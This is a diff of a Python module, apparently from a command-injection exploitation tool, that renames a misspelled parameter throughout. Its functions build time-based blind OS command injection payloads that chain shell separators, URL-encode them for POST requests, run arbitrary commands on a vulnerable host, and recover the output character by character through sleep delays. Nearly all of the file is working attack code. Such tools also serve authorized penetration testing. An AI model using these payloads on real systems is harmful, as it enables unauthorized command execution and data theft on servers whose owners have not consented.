@@ -22,38 +22,38 @@
 import urllib
 
 # Time-based decision payload (check if host is vulnerable).
-def decision(seperator,TAG,j,delay,http_request_method):
-  if seperator == ";" :
-    payload = (seperator + " "
-	      "str=$(echo "+TAG+")" + seperator + " "
+def decision(separator,TAG,j,delay,http_request_method):
+  if separator == ";" :
+    payload = (separator + " "
+	      "str=$(echo "+TAG+")" + separator + " "
 	      # Find the length of the output.
-	      "str1=${#str}" + seperator + " "
-	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + seperator  + " "
-	      "then sleep 0" + seperator + " "
-	      "else sleep " + str(delay) + seperator + " "
+	      "str1=${#str}" + separator + " "
+	      "if [ \"" + str(j) + "\" -ne ${str1} ]" + separator  + " "
+	      "then sleep 0" + separator + " "
+	      "else sleep " + str(delay) + separator + " "
 	      "fi "
 	      )
     
-  elif seperator == "&&" :
+  elif separator == "&&" :
     if http_request_method == "POST":
-      seperator = urllib.quote(seperator)
+      separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "sleep 0  " + seperator + " "
-	      "str=$(echo "+TAG+") " + seperator + " "
+	      "sleep 0  " + separator + " "
+	      "str=$(echo "+TAG+") " + separator + " "
 	      # Find the length of the output.
-	      "str1=${#str} " + seperator + " "
-	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
+	      "str1=${#str} " + separator + " "
+	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
 	      "sleep 1 "
 	      )
     if http_request_method == "POST":
-      seperator = urllib.unquote(seperator)
+      separator = urllib.unquote(separator)
 
-  elif seperator == "||" :
-    payload = (seperator + " "
-	      "[ "+str(j)+" -ne $(echo \""+TAG+"\" | wc -c) ] " + seperator + " "
+  elif separator == "||" :
+    payload = (separator + " "
+	      "[ "+str(j)+" -ne $(echo \""+TAG+"\" | wc -c) ] " + separator + " "
 	      "sleep " + str(delay) + " "
 	      )  
   else:
@@ -62,70 +62,70 @@ def decision(seperator,TAG,j,delay,http_request_method):
   return payload
 
 # Execute shell commands on vulnerable host.
-def cmd_execution(seperator,cmd,j,delay,http_request_method):
-  if seperator == ";" :
-    payload = (seperator + " "
-	      "str=$("+ cmd +")" + seperator +
-	      "str1=${#str}" + seperator +
+def cmd_execution(separator,cmd,j,delay,http_request_method):
+  if separator == ";" :
+    payload = (separator + " "
+	      "str=$("+ cmd +")" + separator +
+	      "str1=${#str}" + separator +
 	      "if [ \"" + str(j) + "\" != ${str1} ]; " +
-	      "then sleep 0" + seperator +
-	      "else sleep " + str(delay) + seperator +
+	      "then sleep 0" + separator +
+	      "else sleep " + str(delay) + separator +
 	      "fi "
 	      )
 	      
-  if seperator == "&&" :
+  if separator == "&&" :
     if http_request_method == "POST":
-      seperator = urllib.quote(seperator)
+      separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "sleep 0  " + seperator + " "
-	      "str=$(\""+cmd+"\")  " + seperator + " "
+	      "sleep 0  " + separator + " "
+	      "str=$(\""+cmd+"\")  " + separator + " "
 	      # Find the length of the output.
-	      "str1=${#str}  " + seperator + " "
-	      "[ " + str(j) + " -eq ${str1} ] " + seperator + " "
+	      "str1=${#str}  " + separator + " "
+	      "[ " + str(j) + " -eq ${str1} ] " + separator + " "
 	      "sleep 1 "
 	      )
     if http_request_method == "POST":
-      seperator = urllib.unquote(seperator)
+      separator = urllib.unquote(separator)
       
-  if seperator == "||" :
-    payload = (seperator + " "
-	      "[ "+str(j)+" -ne $(\""+cmd+"\" | wc -c) ] " + seperator + 
+  if separator == "||" :
+    payload = (separator + " "
+	      "[ "+str(j)+" -ne $(\""+cmd+"\" | wc -c) ] " + separator + 
 	      "sleep " + str(delay) + " "
 	      )
   return payload
 
 # Get the execution ouput, of shell execution.
-def get_char(seperator,cmd,i,ascii_char,delay,http_request_method):
-  if seperator == ";" :
-    payload = (seperator + " "
-	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + seperator +
-	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + seperator +
-	      "then sleep 0" + seperator +
-	      "else sleep " + str(delay) + seperator +
+def get_char(separator,cmd,i,ascii_char,delay,http_request_method):
+  if separator == ";" :
+    payload = (separator + " "
+	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2)" + separator +
+	      "if [ \"" + str(ascii_char) + "\" != ${str} ]" + separator +
+	      "then sleep 0" + separator +
+	      "else sleep " + str(delay) + separator +
 	      "fi "
 	      )
 
-  if seperator == "&&" :
+  if separator == "&&" :
     if http_request_method == "POST":
-      seperator = urllib.quote(seperator)
+      separator = urllib.quote(separator)
       ampersand = urllib.quote("&")
     else:
       ampersand = "&"
     payload = (ampersand + " " +
-	      "sleep 0  " + seperator + " "
-	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + seperator + " "
-	      "[ " + str(ascii_char) + " -eq ${str} ] " + seperator + " "
+	      "sleep 0  " + separator + " "
+	      "str=$(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) " + separator + " "
+	      "[ " + str(ascii_char) + " -eq ${str} ] " + separator + " "
 	      "sleep 1 "
 	      )
     if http_request_method == "POST":
-      seperator = urllib.unquote(seperator)
+      separator = urllib.unquote(separator)
 
-  if seperator == "||" :
-    payload = (seperator + " "
-	      "[ \"" + str(ascii_char) + "\" -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + seperator + 
+  if separator == "||" :
+    payload = (separator + " "
+	      "[ \"" + str(ascii_char) + "\" -ne  $(" + cmd + "|tr '\n' ' '|cut -c " + str(i) + "|od -N 1 -i|head -1|tr -s ' '|cut -d ' ' -f 2) ] " + separator + 
 	      "sleep " + str(delay) + " "
 	      )		
   return payload
